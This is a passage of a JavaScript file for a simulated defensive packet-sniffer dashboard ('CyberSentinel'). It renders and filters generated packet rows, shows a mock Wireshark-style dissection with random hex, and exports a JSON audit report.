  function createPacket(proto, srcIp, dstIp, srcPort, dstPort, length, flags, info, isThreat) {
    return {
      id: packets.length + 1,
      time: new Date().toLocaleTimeString('en-US', { hour12: false }) + '.' + String(Math.floor(Math.random() * 900) + 100),
      proto: proto,
      srcIp: srcIp,
      dstIp: dstIp,
      srcPort: srcPort,
      dstPort: dstPort,
      length: length,
      flags: flags,
      info: info,
      isThreat: isThreat
    };
  }

  function pushPacket(pkt) {
    packets.unshift(pkt);
    totalBytes += pkt.length;

    if (pkt.isThreat) {
      threatCount++;
    }
    if (pkt.proto === 'HTTPS') {
      httpsCount++;
    }

    if (packets.length > 300) {
      packets.pop();
    }

    updateMetricsHUD();
    renderPacketRow(pkt);
  }

  function updateMetricsHUD() {
    metricPackets.textContent = packets.length;
    metricThreats.textContent = threatCount;
    metricBandwidth.textContent = formatBytes(totalBytes);

    const ratio = packets.length > 0 ? Math.round((httpsCount / packets.length) * 100) : 100;
    metricEncryption.textContent = `${ratio}%`;
  }

  function renderPacketRow(pkt) {
    if (packetEmptyNotice) {
      packetEmptyNotice.style.display = 'none';
    }

    // Check filter match
    if (!matchesFilter(pkt)) {
      return;
    }

    const row = document.createElement('div');
    row.className = 'packet-row' + (pkt.isThreat ? ' threat' : '');
    row.setAttribute('data-id', pkt.id);

    let badgeClass = 'badge-tcp';
    if (pkt.isThreat) badgeClass = 'badge-threat';
    else if (pkt.proto === 'HTTPS') badgeClass = 'badge-https';
    else if (pkt.proto === 'HTTP') badgeClass = 'badge-http';
    else if (pkt.proto === 'DNS') badgeClass = 'badge-dns';

    row.innerHTML = `
      <div class="packet-meta">
        <span style="color: var(--text-muted); font-size: 9px;">${pkt.time}</span>
        <span class="badge ${badgeClass}">${pkt.proto}</span>
        <span style="color: var(--cyan);">${pkt.srcIp}:${pkt.srcPort} &rarr; ${pkt.dstIp}:${pkt.dstPort}</span>
        <span style="color: var(--text-muted);">${pkt.length}B</span>
      </div>
      <div class="packet-url" style="${pkt.isThreat ? 'color: var(--rose); font-weight: 700;' : ''}">
        ${escapeHtml(pkt.info)}
      </div>
    `;

    row.addEventListener('click', () => openPacketModal(pkt));

    if (packetStream.firstChild) {
      packetStream.insertBefore(row, packetStream.firstChild);
    } else {
      packetStream.appendChild(row);
    }
  }

  function matchesFilter(pkt) {
    if (activeFilter === 'ALL') return true;
    if (activeFilter === 'THREAT') return pkt.isThreat;
    return pkt.proto === activeFilter;
  }

  function applyPacketFilter() {
    packetStream.innerHTML = '';
    const filtered = packets.filter(matchesFilter);
    if (filtered.length === 0) {
      packetStream.innerHTML = '<div style="padding: 24px; text-align: center; color: var(--text-muted);">No packets match current filter.</div>';
    } else {
      filtered.forEach(p => renderPacketRow(p));
    }
  }

  function togglePauseResume() {
    isRecordingPaused = !isRecordingPaused;
    btnPauseResume.textContent = isRecordingPaused ? 'Resume' : 'Pause';
    btnPauseResume.classList.toggle('highlight', isRecordingPaused);

    if (isRecordingPaused) {
      liveRecordingDot.style.background = 'var(--amber)';
      liveRecordingDot.style.boxShadow = 'none';
      liveRecordingDot.style.animation = 'none';
    } else {
      liveRecordingDot.style.background = 'var(--emerald)';
      liveRecordingDot.style.boxShadow = '0 0 8px var(--emerald)';
      liveRecordingDot.style.animation = 'pulse-green 2s infinite';
    }
  }

  function clearPackets() {
    packets = [];
    threatCount = 0;
    totalBytes = 0;
    httpsCount = 0;
    packetStream.innerHTML = '';
    if (packetEmptyNotice) {
      packetEmptyNotice.style.display = 'block';
    }
    updateMetricsHUD();
  }

  // --- Deep Packet Dissection Modal (Wireshark-grade) ---
  function openPacketModal(pkt) {
    modalPacketId.textContent = `#${pkt.id} [${pkt.proto}]`;

    const rawHex = generateDummyHex(pkt.length);

    modalPacketBody.innerHTML = `
      <div class="dissection-block">
        <div class="dissection-block-title" style="color: var(--cyan);">
          <span>▼ Frame #${pkt.id}: ${pkt.length} bytes on wire (${pkt.length * 8} bits)</span>
          <span style="color: var(--text-muted); font-size: 10px;">${pkt.time}</span>
        </div>
        <div>Arrival Time: ${pkt.time} &bull; Protocols in frame: eth:ethertype:ip:${pkt.proto.toLowerCase()}</div>
        ${pkt.isThreat ? `<div style="color: var(--rose); font-weight: 700; margin-top: 6px; padding: 4px; background: var(--rose-bg); border-radius: 4px;">🚨 THREAT HEURISTIC TRIGGERED: ${escapeHtml(pkt.threatReason || 'Security Anomaly')}</div>` : ''}
      </div>

      <div class="dissection-block">
        <div class="dissection-block-title" style="color: var(--emerald);">
          <span>▼ Ethernet II, Src: 00:1a:2b:3c:4d:5e, Dst: e0:d5:5e:6f:7a:8b</span>
        </div>
        <div>Type: IPv4 (0x0800)</div>
      </div>

      <div class="dissection-block">
        <div class="dissection-block-title" style="color: #38bdf8;">
          <span>▼ Internet Protocol Version 4, Src: ${pkt.srcIp}, Dst: ${pkt.dstIp}</span>
        </div>
        <div>Header Length: 20 bytes &bull; Differentiated Services: 0x00 &bull; Total Length: ${pkt.length}</div>
        <div>Identification: 0x${Math.floor(Math.random() * 65535).toString(16).toUpperCase()} &bull; Time to Live (TTL): 64 &bull; Protocol: ${pkt.proto}</div>
      </div>

      <div class="dissection-block">
        <div class="dissection-block-title" style="color: #c084fc;">
          <span>▼ Transport Layer / Application Protocol (${pkt.proto})</span>
        </div>
        <div>Source Port: ${pkt.srcPort} &bull; Destination Port: ${pkt.dstPort} &bull; Flags: [${pkt.flags}]</div>
        <div style="margin-top: 4px; color: #fff; word-break: break-all;">Payload Info: ${escapeHtml(pkt.info)}</div>
      </div>

      <div class="dissection-block" style="background: #040711;">
        <div class="dissection-block-title" style="color: var(--text-muted); font-size: 10px;">
          <span>HEX / ASCII DISSECTION DUMP</span>
          <span>Offset (Hex)</span>
        </div>
        <div class="hex-dump-container">
          <pre>${rawHex}</pre>
        </div>
      </div>
    `;

    packetModal.style.display = 'flex';
  }

  function exportAuditReport() {
    if (packets.length === 0) {
      alert('No packets captured yet to export.');
      return;
    }

    const report = {
      generator: 'CyberSentinel Defensive Packet Sniffer v2.0',
      timestamp: new Date().toISOString(),
      sessionSummary: {
        totalPackets: packets.length,
        threatsDetected: threatCount,
        totalBytes: totalBytes,
        httpsEncryptionRatio: metricEncryption.textContent,
        quarantinedEndpoints: Array.from(quarantinedHosts.entries()).map(([host, info]) => ({
          host: host,
          ip: info.ip,
          reason: info.reason,
          isolatedAt: info.time
        }))
      },
      packets: packets.map(p => ({
        id: p.id,
        timestamp: p.time,
        protocol: p.proto,
        source: `${p.srcIp}:${p.srcPort}`,
        destination: `${p.dstIp}:${p.dstPort}`,
        length: p.length,
        flags: p.flags,
        info: p.info,
        isThreat: p.isThreat,
        threatReason: p.threatReason || null
      }))
    };

    const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `CyberSentinel_SOC_Audit_${Date.now()}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

  // --- Utilities ---
  function extractHostname(url) {
    try {
      return new URL(url).hostname;
    } catch (_) {
      return url;
    }
  }

  function generatePseudoIp(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      hash = (hash << 5) - hash + str.charCodeAt(i);
      hash |= 0;
    }
    const b1 = Math.abs((hash >> 24) & 255) || 104;
    const b2 = Math.abs((hash >> 16) & 255) || 28;
    const b3 = Math.abs((hash >> 8) & 255) || 19;
    const b4 = Math.abs(hash & 255) || 94;
    return `${b1}.${b2}.${b3}.${b4}`;
  }

  function generateDummyHex(length) {
    const lines = [];
    const maxBytes = Math.min(length, 64);
    for (let i = 0; i < maxBytes; i += 16) {
      const offset = i.toString(16).padStart(4, '0');
      let hexPart = '';
      let asciiPart = '';
      for (let j = 0; j < 16 && (i + j) < maxBytes; j++) {
        const byte = Math.floor(Math.random() * 256);
        hexPart += byte.toString(16).padStart(2, '0') + ' ';
        asciiPart += (byte >= 32 && byte <= 126) ? String.fromCharCode(byte) : '.';
      }
      lines.push(`${offset}  ${hexPart.padEnd(48, ' ')}  |${asciiPart}|`);
    }
    return lines.join('\n');
  }

  function formatBytes(bytes) {
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
    return (bytes / 1048576).toFixed(2) + ' MB';
  }

  function escapeHtml(str) {
    if (!str) return '';
    return str.replace(/[&<>"']/g, function (m) {
      switch (m) {
        case '&': return '&amp;';
        case '<': return '&lt;';
        case '>': return '&gt;';
        case '"': return '&quot;';
        case '\'': return '&#39;';
        default: return m;
      }
    });
  }

  // Run!
  document.addEventListener('DOMContentLoaded', init);
})();
